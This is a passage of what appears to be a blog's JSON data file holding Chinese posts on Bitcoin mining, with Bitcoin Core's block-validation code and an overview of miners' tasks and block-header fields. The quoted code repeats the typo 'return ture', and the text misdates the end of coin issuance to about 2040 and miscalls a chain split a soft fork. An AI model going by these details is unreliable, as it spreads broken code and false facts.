sequences\n        // of transactions in a block without affecting the merkle root of a block,\n        // while still invalidating it.\n        if (mutated)\n            return state.DoS(100, false, REJECT_INVALID, \"bad-txns-duplicate\",true, \"duplicate transaction\");\n    }\n\n    // 在我们做任何的交易校验之前，应该首先做潜在的问题校验，这样一旦我们发现问题，便可以将区块头标记为无效 隔离见证数据并不在此处校验\n\n    // 大小限制\n    // 区块交易不为空，至少存在coinbase交易\n    // 区块size和weight符合要求\n    if (block.vtx.empty() || block.vtx.size() * WITNESS_SCALE_FACTOR > MAX_BLOCK_WEIGHT || ::GetSerializeSize(block, SER_NETWORK, PROTOCOL_VERSION| SERIALIZE_TRANSACTION_NO_WITNESS) * WITNESS_SCALE_FACTOR > MAX_BLOCK_WEIGHT)\n            return state.DoS(100, false, REJECT_INVALID, \"bad-blk-length\",false, \"size limits failed\");\n    \n    // First transaction must be coinbase, the rest must not be\n    // 校验首个交易是否是coinbase交易\n    if (block.vtx.empty() || !block.vtx[0]->IsCoinBase())\n        return state.DoS(100, false, REJECT_INVALID, \"bad-cb-missing\", false,\"first tx is not coinbase\");\n    // 校验coinbase交易是否唯一\n    for (unsigned int i = 1; i < block.vtx.size(); i++)\n        if (block.vtx[i]->IsCoinBase())\n            return state.DoS(100, false, REJECT_INVALID, \"bad-cb-multiple\",false, \"more than one coinbase\");\n\n    // Check transactions\n    // 校验交易是否符合要求，此函数将在比特币挖矿之交易校验中具体介绍\n    for (const auto& tx : block.vtx)\n        if (!CheckTransaction(*tx, state, false))\n            return state.Invalid(false, state.GetRejectCode(),state.GetRejectReason(),strprintf(\"Transaction check failed (tx hash %s) %s\", tx->GetHash().ToString(), state.GetDebugMessage()));\n\n    unsigned int nSigOps = 0;\n    for (const auto& tx : block.vtx)\n    {\n        nSigOps += GetLegacySigOpCount(*tx);\n    }\n    if (nSigOps * WITNESS_SCALE_FACTOR > MAX_BLOCK_SIGOPS_COST)\n        return state.DoS(100, false, REJECT_INVALID, \"bad-blk-sigops\", false,\"out-of-bounds SigOpCount\");\n\n    if (fCheckPOW && fCheckMerkleRoot)\n        block.fChecked = true;\n\n    return ture;\n}\n```\n检查区块头是否满足工作量要求\n```\nstatic bool CheckBlockHeader(const CBlockHeader& block, CValidationState&state, const Consensus::Params& consensusParams, bool fCheckPOW = true)\n{\n    // Check proof of work matches claimed amount\n    // 检查工作量难度是否满足声明要求\n    // CheckProofOfWork方法已经在比特币挖矿之随机数中介绍过\n    if (fCheckPOW && !CheckProofOfWork(block.GetHash(), block.nBits,consensusParams))\n        return state.DoS(50, false, REJECT_INVALID, \"high-hash\", false, \"proof of work failed\");\n    \n    return ture;\n}\n```\n","source":"_posts/比特币挖矿之区块校验.md","raw":"---\ntitle: 比特币挖矿之区块校验\ncomments: false\ndate: 2018-03-09 11:15:45\ncategories: 矿池\ntags:\n- LeonBCK\n- 比特币\n- 矿池\nimg:\n---\n在[比特币挖矿之矿工任务](http://c60block.com/2018/02/28/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E7%9F%BF%E5%B7%A5%E4%BB%BB%E5%8A%A1-1/)中我们提到，矿工的首要任务是同步区块链已有数据，监听新区块。当新的区块在网络中传播时，每一个全节点在将它转发到其他节点之前，会进行一系列的测试去验证区块的合法性。下面我们将对校验标准进行具体介绍。\n\n## 区块校验\n比特币区块的校验标准如下：\n1、区块头的的哈希值满足当前目标值（工作量证明）\n2、重构Merkle树得到的树根与区块头中hashMerkleRoot值一致（验证MerkleRoot是否由区块中交易得到）\n3、区块大小在长度限制内\n4、第一个交易是coinbase交易,且其他交易都不是coinbase交易\n5、遍历区块内所有交易，[检查交易](http://c60block.com/2018/03/09/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E4%BA%A4%E6%98%93%E6%A0%A1%E9%AA%8C/)合法性\n\n以上的校验标准主要在比特币核心客户端的[CheckBlock](https://github.com/bitcoin/bitcoin/blob/3fa24bb217b207d964acd4db4cb5df085a7d3ce5/src/validation.cpp#L3008)函数中获得，具体源码如下：\n```\nbool CheckBlock(const CBlock& block, CValidationState& state, const Consensus::Params& consensusParams, bool fCheckPOW, bool fCheckMerkleRoot)\n{\n    // These are checks that are independent of context.\n    \n    // 如果区块已经检查过，则直接返回结果true\n    if (block.fChecked)\n        return true;\n    \n    // 检查区块头是否满足工作量要求 \n    if (!CheckBlockHeader(block, state, consensusParams, fCheckPOW))\n        return false;\n\n    // 判断是否校验MerkleRoot 若检查，则校验MerkleRoot是否符合要求，是否存在重复交易\n    if (fCheckMerkleRoot) {\n        bool mutated;\n        // 重新构建一遍Merkle树，返回MerkleRoot\n        uint256 hashMerkleRoot2 = BlockMerkleRoot(block, &mutated);\n        if (block.hashMerkleRoot != hashMerkleRoot2)\n            return state.DoS(100, false, REJECT_INVALID, \"bad-txnmrklroot\",true, \"hashMerkleRoot mismatch\");\n\n        // Check for merkle tree malleability (CVE-2012-2459): repeating sequences\n        // of transactions in a block without affecting the merkle root of a block,\n        // while still invalidating it.\n        if (mutated)\n            return state.DoS(100, false, REJECT_INVALID, \"bad-txns-duplicate\",true, \"duplicate transaction\");\n    }\n\n    // 在我们做任何的交易校验之前，应该首先做潜在的问题校验，这样一旦我们发现问题，便可以将区块头标记为无效 隔离见证数据并不在此处校验\n\n    // 大小限制\n    // 区块交易不为空，至少存在coinbase交易\n    // 区块size和weight符合要求\n    if (block.vtx.empty() || block.vtx.size() * WITNESS_SCALE_FACTOR > MAX_BLOCK_WEIGHT || ::GetSerializeSize(block, SER_NETWORK, PROTOCOL_VERSION| SERIALIZE_TRANSACTION_NO_WITNESS) * WITNESS_SCALE_FACTOR > MAX_BLOCK_WEIGHT)\n            return state.DoS(100, false, REJECT_INVALID, \"bad-blk-length\",false, \"size limits failed\");\n    \n    // First transaction must be coinbase, the rest must not be\n    // 校验首个交易是否是coinbase交易\n    if (block.vtx.empty() || !block.vtx[0]->IsCoinBase())\n        return state.DoS(100, false, REJECT_INVALID, \"bad-cb-missing\", false,\"first tx is not coinbase\");\n    // 校验coinbase交易是否唯一\n    for (unsigned int i = 1; i < block.vtx.size(); i++)\n        if (block.vtx[i]->IsCoinBase())\n            return state.DoS(100, false, REJECT_INVALID, \"bad-cb-multiple\",false, \"more than one coinbase\");\n\n    // Check transactions\n    // 校验交易是否符合要求，此函数将在比特币挖矿之交易校验中具体介绍\n    for (const auto& tx : block.vtx)\n        if (!CheckTransaction(*tx, state, false))\n            return state.Invalid(false, state.GetRejectCode(),state.GetRejectReason(),strprintf(\"Transaction check failed (tx hash %s) %s\", tx->GetHash().ToString(), state.GetDebugMessage()));\n\n    unsigned int nSigOps = 0;\n    for (const auto& tx : block.vtx)\n    {\n        nSigOps += GetLegacySigOpCount(*tx);\n    }\n    if (nSigOps * WITNESS_SCALE_FACTOR > MAX_BLOCK_SIGOPS_COST)\n        return state.DoS(100, false, REJECT_INVALID, \"bad-blk-sigops\", false,\"out-of-bounds SigOpCount\");\n\n    if (fCheckPOW && fCheckMerkleRoot)\n        block.fChecked = true;\n\n    return ture;\n}\n```\n检查区块头是否满足工作量要求\n```\nstatic bool CheckBlockHeader(const CBlockHeader& block, CValidationState&state, const Consensus::Params& consensusParams, bool fCheckPOW = true)\n{\n    // Check proof of work matches claimed amount\n    // 检查工作量难度是否满足声明要求\n    // CheckProofOfWork方法已经在比特币挖矿之随机数中介绍过\n    if (fCheckPOW && !CheckProofOfWork(block.GetHash(), block.nBits,consensusParams))\n        return state.DoS(50, false, REJECT_INVALID, \"high-hash\", false, \"proof of work failed\");\n    \n    return ture;\n}\n```\n","slug":"比特币挖矿之区块校验","published":1,"updated":"2018-03-09T09:57:45.589Z","layout":"post","photos":[],"link":"","_id":"cjf7piaw7001ypkwomgwbm7wf","content":"<p>在<a href=\"http://c60block.com/2018/02/28/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E7%9F%BF%E5%B7%A5%E4%BB%BB%E5%8A%A1-1/\" target=\"_blank\" rel=\"noopener\">比特币挖矿之矿工任务</a>中我们提到，矿工的首要任务是同步区块链已有数据，监听新区块。当新的区块在网络中传播时，每一个全节点在将它转发到其他节点之前，会进行一系列的测试去验证区块的合法性。下面我们将对校验标准进行具体介绍。</p>\n<h2 id=\"区块校验\"><a href=\"#区块校验\" class=\"headerlink\" title=\"区块校验\"></a>区块校验</h2><p>比特币区块的校验标准如下：<br>1、区块头的的哈希值满足当前目标值（工作量证明）<br>2、重构Merkle树得到的树根与区块头中hashMerkleRoot值一致（验证MerkleRoot是否由区块中交易得到）<br>3、区块大小在长度限制内<br>4、第一个交易是coinbase交易,且其他交易都不是coinbase交易<br>5、遍历区块内所有交易，<a href=\"http://c60block.com/2018/03/09/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E4%BA%A4%E6%98%93%E6%A0%A1%E9%AA%8C/\" target=\"_blank\" rel=\"noopener\">检查交易</a>合法性</p>\n<p>以上的校验标准主要在比特币核心客户端的<a href=\"https://github.com/bitcoin/bitcoin/blob/3fa24bb217b207d964acd4db4cb5df085a7d3ce5/src/validation.cpp#L3008\" target=\"_blank\" rel=\"noopener\">CheckBlock</a>函数中获得，具体源码如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bool CheckBlock(const CBlock&amp; block, CValidationState&amp; state, const Consensus::Params&amp; consensusParams, bool fCheckPOW, bool fCheckMerkleRoot)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    // These are checks that are independent of context.</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 如果区块已经检查过，则直接返回结果true</span><br><span class=\"line\">    if (block.fChecked)</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 检查区块头是否满足工作量要求 </span><br><span class=\"line\">    if (!CheckBlockHeader(block, state, consensusParams, fCheckPOW))</span><br><span class=\"line\">        return false;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 判断是否校验MerkleRoot 若检查，则校验MerkleRoot是否符合要求，是否存在重复交易</span><br><span class=\"line\">    if (fCheckMerkleRoot) &#123;</span><br><span class=\"line\">        bool mutated;</span><br><span class=\"line\">        // 重新构建一遍Merkle树，返回MerkleRoot</span><br><span class=\"line\">        uint256 hashMerkleRoot2 = BlockMerkleRoot(block, &amp;mutated);</span><br><span class=\"line\">        if (block.hashMerkleRoot != hashMerkleRoot2)</span><br><span class=\"line\">            return state.DoS(100, false, REJECT_INVALID, &quot;bad-txnmrklroot&quot;,true, &quot;hashMerkleRoot mismatch&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        // Check for merkle tree malleability (CVE-2012-2459): repeating sequences</span><br><span class=\"line\">        // of transactions in a block without affecting the merkle root of a block,</span><br><span class=\"line\">        // while still invalidating it.</span><br><span class=\"line\">        if (mutated)</span><br><span class=\"line\">            return state.DoS(100, false, REJECT_INVALID, &quot;bad-txns-duplicate&quot;,true, &quot;duplicate transaction&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 在我们做任何的交易校验之前，应该首先做潜在的问题校验，这样一旦我们发现问题，便可以将区块头标记为无效 隔离见证数据并不在此处校验</span><br><span class=\"line\"></span><br><span class=\"line\">    // 大小限制</span><br><span class=\"line\">    // 区块交易不为空，至少存在coinbase交易</span><br><span class=\"line\">    // 区块size和weight符合要求</span><br><span class=\"line\">    if (block.vtx.empty() || block.vtx.size() * WITNESS_SCALE_FACTOR &gt; MAX_BLOCK_WEIGHT || ::GetSerializeSize(block, SER_NETWORK, PROTOCOL_VERSION| SERIALIZE_TRANSACTION_NO_WITNESS) * WITNESS_SCALE_FACTOR &gt; MAX_BLOCK_WEIGHT)</span><br><span class=\"line\">            return state.DoS(100, false, REJECT_INVALID, &quot;bad-blk-length&quot;,false, &quot;size limits failed&quot;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    // First transaction must be coinbase, the rest must not be</span><br><span class=\"line\">    // 校验首个交易是否是coinbase交易</span><br><span class=\"line\">    if (block.vtx.empty() || !block.vtx[0]-&gt;IsCoinBase())</span><br><span class=\"line\">        return state.DoS(100, false, REJECT_INVALID, &quot;bad-cb-missing&quot;, false,&quot;first tx is not coinbase&quot;);</span><br><span class=\"line\">    // 校验coinbase交易是否唯一</span><br><span class=\"line\">    for (unsigned int i = 1; i &lt; block.vtx.size(); i++)</span><br><span class=\"line\">        if (block.vtx[i]-&gt;IsCoinBase())</span><br><span class=\"line\">            return state.DoS(100, false, REJECT_INVALID, &quot;bad-cb-multiple&quot;,false, &quot;more than one coinbase&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    // Check transactions</span><br><span class=\"line\">    // 校验交易是否符合要求，此函数将在比特币挖矿之交易校验中具体介绍</span><br><span class=\"line\">    for (const auto&amp; tx : block.vtx)</span><br><span class=\"line\">        if (!CheckTransaction(*tx, state, false))</span><br><span class=\"line\">            return state.Invalid(false, state.GetRejectCode(),state.GetRejectReason(),strprintf(&quot;Transaction check failed (tx hash %s) %s&quot;, tx-&gt;GetHash().ToString(), state.GetDebugMessage()));</span><br><span class=\"line\"></span><br><span class=\"line\">    unsigned int nSigOps = 0;</span><br><span class=\"line\">    for (const auto&amp; tx : block.vtx)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        nSigOps += GetLegacySigOpCount(*tx);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (nSigOps * WITNESS_SCALE_FACTOR &gt; MAX_BLOCK_SIGOPS_COST)</span><br><span class=\"line\">        return state.DoS(100, false, REJECT_INVALID, &quot;bad-blk-sigops&quot;, false,&quot;out-of-bounds SigOpCount&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    if (fCheckPOW &amp;&amp; fCheckMerkleRoot)</span><br><span class=\"line\">        block.fChecked = true;</span><br><span class=\"line\"></span><br><span class=\"line\">    return ture;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>检查区块头是否满足工作量要求<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static bool CheckBlockHeader(const CBlockHeader&amp; block, CValidationState&amp;state, const Consensus::Params&amp; consensusParams, bool fCheckPOW = true)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    // Check proof of work matches claimed amount</span><br><span class=\"line\">    // 检查工作量难度是否满足声明要求</span><br><span class=\"line\">    // CheckProofOfWork方法已经在比特币挖矿之随机数中介绍过</span><br><span class=\"line\">    if (fCheckPOW &amp;&amp; !CheckProofOfWork(block.GetHash(), block.nBits,consensusParams))</span><br><span class=\"line\">        return state.DoS(50, false, REJECT_INVALID, &quot;high-hash&quot;, false, &quot;proof of work failed&quot;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    return ture;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>在<a href=\"http://c60block.com/2018/02/28/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E7%9F%BF%E5%B7%A5%E4%BB%BB%E5%8A%A1-1/\" target=\"_blank\" rel=\"noopener\">比特币挖矿之矿工任务</a>中我们提到，矿工的首要任务是同步区块链已有数据，监听新区块。当新的区块在网络中传播时，每一个全节点在将它转发到其他节点之前，会进行一系列的测试去验证区块的合法性。下面我们将对校验标准进行具体介绍。</p>\n<h2 id=\"区块校验\"><a href=\"#区块校验\" class=\"headerlink\" title=\"区块校验\"></a>区块校验</h2><p>比特币区块的校验标准如下：<br>1、区块头的的哈希值满足当前目标值（工作量证明）<br>2、重构Merkle树得到的树根与区块头中hashMerkleRoot值一致（验证MerkleRoot是否由区块中交易得到）<br>3、区块大小在长度限制内<br>4、第一个交易是coinbase交易,且其他交易都不是coinbase交易<br>5、遍历区块内所有交易，<a href=\"http://c60block.com/2018/03/09/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E4%BA%A4%E6%98%93%E6%A0%A1%E9%AA%8C/\" target=\"_blank\" rel=\"noopener\">检查交易</a>合法性</p>\n<p>以上的校验标准主要在比特币核心客户端的<a href=\"https://github.com/bitcoin/bitcoin/blob/3fa24bb217b207d964acd4db4cb5df085a7d3ce5/src/validation.cpp#L3008\" target=\"_blank\" rel=\"noopener\">CheckBlock</a>函数中获得，具体源码如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bool CheckBlock(const CBlock&amp; block, CValidationState&amp; state, const Consensus::Params&amp; consensusParams, bool fCheckPOW, bool fCheckMerkleRoot)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    // These are checks that are independent of context.</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 如果区块已经检查过，则直接返回结果true</span><br><span class=\"line\">    if (block.fChecked)</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 检查区块头是否满足工作量要求 </span><br><span class=\"line\">    if (!CheckBlockHeader(block, state, consensusParams, fCheckPOW))</span><br><span class=\"line\">        return false;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 判断是否校验MerkleRoot 若检查，则校验MerkleRoot是否符合要求，是否存在重复交易</span><br><span class=\"line\">    if (fCheckMerkleRoot) &#123;</span><br><span class=\"line\">        bool mutated;</span><br><span class=\"line\">        // 重新构建一遍Merkle树，返回MerkleRoot</span><br><span class=\"line\">        uint256 hashMerkleRoot2 = BlockMerkleRoot(block, &amp;mutated);</span><br><span class=\"line\">        if (block.hashMerkleRoot != hashMerkleRoot2)</span><br><span class=\"line\">            return state.DoS(100, false, REJECT_INVALID, &quot;bad-txnmrklroot&quot;,true, &quot;hashMerkleRoot mismatch&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        // Check for merkle tree malleability (CVE-2012-2459): repeating sequences</span><br><span class=\"line\">        // of transactions in a block without affecting the merkle root of a block,</span><br><span class=\"line\">        // while still invalidating it.</span><br><span class=\"line\">        if (mutated)</span><br><span class=\"line\">            return state.DoS(100, false, REJECT_INVALID, &quot;bad-txns-duplicate&quot;,true, &quot;duplicate transaction&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 在我们做任何的交易校验之前，应该首先做潜在的问题校验，这样一旦我们发现问题，便可以将区块头标记为无效 隔离见证数据并不在此处校验</span><br><span class=\"line\"></span><br><span class=\"line\">    // 大小限制</span><br><span class=\"line\">    // 区块交易不为空，至少存在coinbase交易</span><br><span class=\"line\">    // 区块size和weight符合要求</span><br><span class=\"line\">    if (block.vtx.empty() || block.vtx.size() * WITNESS_SCALE_FACTOR &gt; MAX_BLOCK_WEIGHT || ::GetSerializeSize(block, SER_NETWORK, PROTOCOL_VERSION| SERIALIZE_TRANSACTION_NO_WITNESS) * WITNESS_SCALE_FACTOR &gt; MAX_BLOCK_WEIGHT)</span><br><span class=\"line\">            return state.DoS(100, false, REJECT_INVALID, &quot;bad-blk-length&quot;,false, &quot;size limits failed&quot;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    // First transaction must be coinbase, the rest must not be</span><br><span class=\"line\">    // 校验首个交易是否是coinbase交易</span><br><span class=\"line\">    if (block.vtx.empty() || !block.vtx[0]-&gt;IsCoinBase())</span><br><span class=\"line\">        return state.DoS(100, false, REJECT_INVALID, &quot;bad-cb-missing&quot;, false,&quot;first tx is not coinbase&quot;);</span><br><span class=\"line\">    // 校验coinbase交易是否唯一</span><br><span class=\"line\">    for (unsigned int i = 1; i &lt; block.vtx.size(); i++)</span><br><span class=\"line\">        if (block.vtx[i]-&gt;IsCoinBase())</span><br><span class=\"line\">            return state.DoS(100, false, REJECT_INVALID, &quot;bad-cb-multiple&quot;,false, &quot;more than one coinbase&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    // Check transactions</span><br><span class=\"line\">    // 校验交易是否符合要求，此函数将在比特币挖矿之交易校验中具体介绍</span><br><span class=\"line\">    for (const auto&amp; tx : block.vtx)</span><br><span class=\"line\">        if (!CheckTransaction(*tx, state, false))</span><br><span class=\"line\">            return state.Invalid(false, state.GetRejectCode(),state.GetRejectReason(),strprintf(&quot;Transaction check failed (tx hash %s) %s&quot;, tx-&gt;GetHash().ToString(), state.GetDebugMessage()));</span><br><span class=\"line\"></span><br><span class=\"line\">    unsigned int nSigOps = 0;</span><br><span class=\"line\">    for (const auto&amp; tx : block.vtx)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        nSigOps += GetLegacySigOpCount(*tx);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (nSigOps * WITNESS_SCALE_FACTOR &gt; MAX_BLOCK_SIGOPS_COST)</span><br><span class=\"line\">        return state.DoS(100, false, REJECT_INVALID, &quot;bad-blk-sigops&quot;, false,&quot;out-of-bounds SigOpCount&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    if (fCheckPOW &amp;&amp; fCheckMerkleRoot)</span><br><span class=\"line\">        block.fChecked = true;</span><br><span class=\"line\"></span><br><span class=\"line\">    return ture;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>检查区块头是否满足工作量要求<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static bool CheckBlockHeader(const CBlockHeader&amp; block, CValidationState&amp;state, const Consensus::Params&amp; consensusParams, bool fCheckPOW = true)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    // Check proof of work matches claimed amount</span><br><span class=\"line\">    // 检查工作量难度是否满足声明要求</span><br><span class=\"line\">    // CheckProofOfWork方法已经在比特币挖矿之随机数中介绍过</span><br><span class=\"line\">    if (fCheckPOW &amp;&amp; !CheckProofOfWork(block.GetHash(), block.nBits,consensusParams))</span><br><span class=\"line\">        return state.DoS(50, false, REJECT_INVALID, &quot;high-hash&quot;, false, &quot;proof of work failed&quot;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    return ture;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"比特币挖矿之矿工任务","comments":0,"date":"2018-02-28T03:10:09.000Z","img":null,"_content":"\n## 挖矿介绍\n中本聪为了实现比特币的去中心化，引入了工作量证明机制(proof of work)。工作量证明的理念是把随机选取节点记账改为根据算力来选取节点，任何一个提议并创建区块的节点要想构建下一个区块，必须找到一个解，当把这个解与前区块的哈希值、当前时间戳、区块包含交易集合唯一标识MerkleRoot等组装起来，带入哈希函数时，刚好小于指定的目标值，这一系列操作就称为“挖矿\"，而进行挖矿的人则被称为\"矿工\"。\n\n## 矿工任务\n考虑到矿工记账的积极性，中本聪在比特币系统中，设计了两种奖励，一是区块奖励，初始为每挖到一个区块奖励50个比特币，每四年递减一次，到2040年左右发放完毕，总量约为2100万个，而这也是比特币系统产生新币的唯一来源。二是交易手续费，区块中所包含交易的所有交易手续费都归成功打包该区块的矿工所得，交易手续费的重要性随着区块奖励的减少会逐渐提升，最终完全取代区块奖励，成为比特币系统刺激矿工挖矿的唯一物质激励。那么矿工作为淘金者，都需要做哪些工作呢？要想成为比特币矿工，首先要加入比特币网络并与其他节点相连，建立连接后，还有如下任务要完成：\n1、同步区块链已有数据，监听新区块。比特币系统默认最长链作为系统主链，因此只有在已有最长链的基础上打包区块，才可能得到大家的认可。\n2、监听交易广播。监听网络上的交易广播，验证交易签名是否有效，是否存在双花，付款地址有没有足够的余额，验证通过，放入交易池。\n3、构建coinbase交易，组装新区块。coinbase交易为矿工自行构建，用以接收挖矿奖励。矿工应以全网最长链上的最后一个区块为基础构建新区块。\n4、找到让区块满足要求的随机数。工作量证明就体现在这一步，最为耗时。\n5、广播新区块。为了获得区块奖励和交易手续费，矿工在成功打包新区块后，会在第一时间向全网广播，因为网络延迟，所以存在相近时间不同矿工成功打包出不同区块的情况，这时便会出现软分叉，只有被大部分矿工所接受，新区块才算真正加入区块链。\n\n## 区块头BlockHeader\n挖矿的本质是执行Hash函数，而Hash函数是一个单向函数，一个输入对应一个输出，根据输入可以很容易计算出输出，但根据输出无法逆推出输入。当输出小于目标值值，便可认为一次挖矿成功，而这里输入数据就是区块头。比特币的区块头有如下6个字段：\n```\nint32_t nVersion;            //版本号，4字节\nuint256 hashPrevBlock;       //前一个区块的hash值，32字节\nuint256 hashMerkleRoot;      //根据区块所包含交易构建的Merkle树根，32字节\nuint32_t nTime;              //Uinx时间戳，4字节\nuint32_t nBits;              //难度的压缩表示，4字节\nuint32_t nNonce;             //随机数，4字节\n```\n比特币挖矿就是对区块头的80个字节进行两次SHA256运算，得到32字节的数据，使之满足nBits转化出来的目标值。可用如下公式表示：\n```\nSHA256(SHA256(nVersion+hashPrevBlock+hashMerkleRoot+nTime+nBits+nNonce))<F(nBits)\n```\n关于区块头BlockHeader各字段的具体含义将在接下来的文章具体介绍。\n","source":"_posts/比特币挖矿之矿工任务.md","raw":"---\ntitle: 比特币挖矿之矿工任务\ncomments: false\ndate: 2018-02-28 11:10:09\ncategories: 矿池\ntags: \n- LeonBCK \n- 矿池 \nimg:\n---\n\n## 挖矿介绍\n中本聪为了实现比特币的去中心化，引入了工作量证明机制(proof of 